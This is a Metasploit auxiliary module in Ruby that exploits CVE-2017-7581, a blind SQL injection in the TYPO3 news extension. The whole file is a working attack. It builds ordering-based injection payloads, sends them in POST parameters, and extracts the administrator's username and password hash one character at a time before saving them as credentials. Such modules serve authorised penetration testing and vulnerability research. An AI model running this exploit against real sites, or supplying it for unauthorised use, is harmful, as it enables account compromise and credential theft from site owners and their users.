##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'TYPO3 News Module SQL Injection',
      'Description'    => %q{
        This module exploits a SQL Injection vulnerability In TYPO3 NewsController.php
        in the news module 5.3.2 and earlier. It allows an unauthenticated user to execute arbitrary
        SQL commands via vectors involving overwriteDemand and OrderByAllowed. The SQL injection
        can be used to obtain password hashes for application user accounts. This module has been
        tested on TYPO3 3.16.0 running news extension 5.0.0.

        This module tries to extract username and password hash of the administrator user.
        It tries to inject sql and check every letter of a pattern, to see
        if it belongs to the username or password it tries to alter the ordering of results. If
        the letter doesn't belong to the word being extracted then all results are inverted
        (News #2 appears before News #1, so Pattern2 before Pattern1), instead if the letter belongs
        to the word being extracted then the results are in proper order (News #1 appears before News #2,
        so Pattern1 before Pattern2)
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Marco Rivoli', # MSF code
          'Charles Fol'   # initial discovery, POC
        ],
      'References'     =>
        [
          ['CVE', '2017-7581'],
          ['URL', 'http://www.ambionics.io/blog/typo3-news-module-sqli'] # Advisory
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'DisclosureDate' => 'Apr 6 2017'))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path of TYPO3', '/']),
        OptString.new('ID', [true, 'The id of TYPO3 news page', '1']),
        OptString.new('PATTERN1', [false, 'Pattern of the first article title', 'Article #1']),
        OptString.new('PATTERN2', [false, 'Pattern of the second article title', 'Article #2'])
      ])
  end

  def dump_the_hash(patterns = {})
    ascii_charset_lower = "a".upto("z").to_a.join('')
    ascii_charset_upper = "A".upto("Z").to_a.join('')
    ascii_charset = "#{ascii_charset_lower}#{ascii_charset_upper}"
    digit_charset = "0".upto("9").to_a.join('')
    full_charset = "#{ascii_charset}#{digit_charset}$./"

    username = blind('username','be_users', 'uid=1', ascii_charset, digit_charset, patterns)
    print_good("Username: #{username}")
    password = blind('password','be_users', 'uid=1', full_charset, digit_charset, patterns)
    print_good("Password Hash: #{password}")

    connection_details = {
            module_fullname: self.fullname,
            username: username,
            private_data: password,
            private_type: :nonreplayable_hash,
            workspace_id: myworkspace_id
        }.merge!(service_details)
    credential_core = create_credential(connection_details)
    login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED,
        workspace_id: myworkspace_id
    }.merge(service_details)
    create_credential_login(login_data)
  end

  def blind(field, table, condition, charset, digit_charset, patterns = {})
    # Adding 9 so that the result has two digits, If the lenght is superior to 100-9 it won't work
    offset = 9
    size = blind_size("length(#{field})+#{offset}",
                      table,
                      condition,
                      2,
                      digit_charset,
                      patterns)
    size = size.to_i - offset
    vprint_status("Retrieving field '#{field}' string (#{size} bytes)...")
    data = blind_size(field,
                      table,
                      condition,
                      size,
                      charset,
                      patterns)
    data
  end

  def select_position(field, table, condition, position, char)
    payload1 = "select(#{field})from(#{table})where(#{condition})"
    payload2 = "ord(substring((#{payload1})from(#{position})for(1)))"
    payload3 = "uid*(case((#{payload2})=#{char.ord})when(1)then(1)else(-1)end)"
    payload3
  end

  def blind_size(field, table, condition, size, charset,  patterns = {})
    str = ''
    for position in 0..size
      for char in charset.split('')
        payload = select_position(field, table, condition, position + 1, char)
        if test(payload, patterns)
          str += char.to_s
          break
        end
      end
    end
    str
  end

  def test(payload, patterns = {})
    begin
      res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => normalize_uri(target_uri.path,'index.php'),
        'vars_get' => {
          'id' => datastore['ID'],
          'no_cache' => '1'
        },
        'vars_post' => {
          'tx_news_pi1[overwriteDemand][OrderByAllowed]' => payload,
          'tx_news_pi1[search][maximumDate]' => '', # Not required
          'tx_news_pi1[overwriteDemand][order]' => payload,
          'tx_news_pi1[search][subject]' => '',
          'tx_news_pi1[search][minimumDate]' => '' # Not required
        }
      })
    rescue Rex::ConnectionError, Errno::CONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
    end
    if res && res.code == 200
      unless res.body.index(patterns[:pattern1]).nil? || res.body.index(patterns[:pattern2]).nil?
        return res.body.index(patterns[:pattern1]) < res.body.index(patterns[:pattern2])
      end
    end
    false
  end

  def try_autodetect_patterns
    print_status("Trying to automatically determine Pattern1 and Pattern2...")
    begin
      res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => normalize_uri(target_uri.path,'index.php'),
        'vars_get' => {
          'id' => datastore['ID'],
          'no_cache' => '1'
        }
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
      return '', ''
    end

    if res && res.code == 200
      news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]')
      pattern1 = news[0].nil? ? '' : news[0].search('span[@itemprop="headline"]').text
      pattern2 = news[1].nil? ? '' : news[1].search('span[@itemprop="headline"]').text
    end

    if pattern1.to_s.eql?('') || pattern2.to_s.eql?('')
      print_status("Couldn't determine Pattern1 and Pattern2 automatically, switching to user speficied values...")
      pattern1 = datastore['PATTERN1']
      pattern2 = datastore['PATTERN2']
    end

    print_status("Pattern1: #{pattern1}, Pattern2: #{pattern2}")
    return pattern1, pattern2
  end

  def run
    pattern1, pattern2 = try_autodetect_patterns
    if pattern1 == '' || pattern2 == ''
      print_error("Unable to determine pattern, aborting...")
    else
      dump_the_hash(:pattern1 => pattern1, :pattern2 => pattern2)
    end
  end
end
